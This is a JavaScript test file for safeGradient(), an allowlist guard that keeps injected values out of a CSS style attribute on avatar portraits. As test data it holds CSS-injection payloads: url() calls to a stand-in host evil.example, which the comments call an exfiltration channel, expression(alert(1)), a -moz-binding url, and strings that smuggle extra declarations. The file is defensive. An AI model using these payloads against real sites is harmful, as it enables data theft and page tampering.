// tools/test-safe-gradient.js
// ============================================================
//  `safeGradient()` — the CSS-context guard for the avatar portrait.
//
//  WHY IT IS NOT escapeHtml(). The value is interpolated into `style="background:${...}"`, i.e.
//  INSIDE a CSS declaration block. The dangerous payloads there contain NO HTML metacharacters, so
//  escapeHtml() passes them through completely untouched while looking like a fix:
//    - `;` ends the declaration and starts a new one the author never wrote
//    - `url(...)` fetches an attacker-chosen resource — a working exfiltration channel
//    - `expression(...)` executes on legacy engines
//  Escaping characters cannot secure a grammar that is not HTML's. This ALLOWLISTS a shape.
//
//  WHY IT EXISTS AT ALL, given AVATAR_PROFILES is a hard-coded table: that table is ALREADY mutated
//  at runtime — `AVATAR_PROFILES[employee].photo = dataUrl` writes an uploaded value into it — so
//  "these are source literals" is true today and is not a guarantee. User-editable avatar colours
//  are a plausible next step for this product.
//
//  The function is read OUT OF THE SHIPPED FILE rather than retyped, so this tests what actually
//  ships. A retyped copy would keep passing after someone edited app.js.
// ============================================================

const assert = require('assert');
const fs = require('fs');
const path = require('path');

const APP = path.join(__dirname, '..', 'dashboard', 'js', 'app.js');
const src = fs.readFileSync(APP, 'utf8');

const m = src.match(/const CSS_GRADIENT_RE = [^\n]+\nconst DEFAULT_GRADIENT = [^\n]+\nfunction safeGradient\(value\) \{[\s\S]*?\n\}/);
assert.ok(m, 'safeGradient() not found in dashboard/js/app.js — did it get renamed or removed?');
const safeGradient = new Function(`${m[0]}; return safeGradient;`)();
const DEFAULT = 'linear-gradient(135deg, #1e3a5f, #3b52cc)';

let pass = 0;
const ok = (label, fn) => { fn(); console.log(`ok  : ${label}`); pass++; };

// --- The real values must survive verbatim, or the guard is just a bug. ------------------------
ok('passes the six real AVATAR_PROFILES gradients through UNCHANGED', () => {
  const real = [...src.matchAll(/gradient: *'([^']+)'/g)].map((x) => x[1]);
  assert.ok(real.length >= 4, `expected to find the real gradients in app.js, found ${real.length}`);
  for (const g of real) {
    assert.strictEqual(safeGradient(g), g, `a REAL gradient was rejected and replaced: ${g}`);
  }
});

// --- The payloads that escapeHtml() would NOT have stopped. -----------------------------------
// Each of these is free of HTML metacharacters, which is the whole point: escaping is not a
// defence in a CSS context.
ok('rejects the CSS-context payloads that carry no HTML metacharacters', () => {
  const attacks = [
    'red; background-image: url(https://evil.example/steal)',
    'url(https://evil.example/pixel.png)',
    'expression(alert(1))',
    'linear-gradient(135deg, #fff, #000); position: fixed; inset: 0; z-index: 9999',
    '#fff;}body{display:none',
    'var(--secret)',
    'linear-gradient(135deg, url(x))',
    '-moz-binding: url(https://evil.example/x.xml)',
  ];
  for (const a of attacks) {
    assert.strictEqual(safeGradient(a), DEFAULT, `payload was NOT neutralised: ${a}`);
    // Prove the point: escapeHtml would have left these untouched.
    assert.ok(!/[<>"'&]/.test(a), `test is not exercising the CSS-specific case: ${a}`);
  }
});

ok('falls back for null, undefined, empty and non-strings', () => {
  for (const v of [null, undefined, '', 0, false, {}, [], () => {}]) {
    assert.strictEqual(safeGradient(v), DEFAULT, `unexpected pass-through for ${String(v)}`);
  }
});

ok('accepts well-formed variants (negative/decimal angles, 3- and 8-digit hex, many stops)', () => {
  const good = [
    'linear-gradient(0deg, #fff, #000)',
    'linear-gradient(-45deg, #abc, #def)',
    'linear-gradient(22.5deg, #11223344, #55667788)',
    'linear-gradient(135deg, #111, #222, #333, #444)',
  ];
  for (const g of good) assert.strictEqual(safeGradient(g), g, `a legitimate gradient was rejected: ${g}`);
});

ok('rejects a gradient with a trailing declaration smuggled after the closing paren', () => {
  // The anchored $ is what stops this; a non-anchored regex would match the prefix and pass it on.
  assert.strictEqual(safeGradient('linear-gradient(135deg, #fff, #000) ; color: red'), DEFAULT);
});

console.log(`\nALL TESTS PASSED\n${pass} assertions`);
